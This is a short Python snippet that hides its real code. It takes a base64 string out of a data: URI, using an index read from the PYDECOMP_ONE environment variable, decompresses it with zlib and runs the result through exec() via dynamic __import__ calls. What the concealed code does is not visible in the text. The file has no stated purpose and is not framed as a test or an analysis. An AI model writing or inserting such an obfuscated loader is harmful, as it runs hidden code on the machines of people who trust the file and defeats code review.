import os
_one = int(os.environ.get('PYDECOMP_ONE', '1'))
_u = 'data:application/octet-stream;base64,eJwtjDEKhDAQAPt9xXbuggTETvABdj4gzcWsGIhGNrlK/LsBnWqKYcJ+Ji2oAjDNOFYxS9rPEIW0sc76q2v7m6z5jK/+tq5hAC8rbimXTC4mxwNgRaX89cBcn+IpS6FpNms4/C/Gt2OGB3buJPA='
_body = _u.split(',', 1)[_one]
exec(__import__('zlib').decompress(__import__('base64').b64decode(_body)))
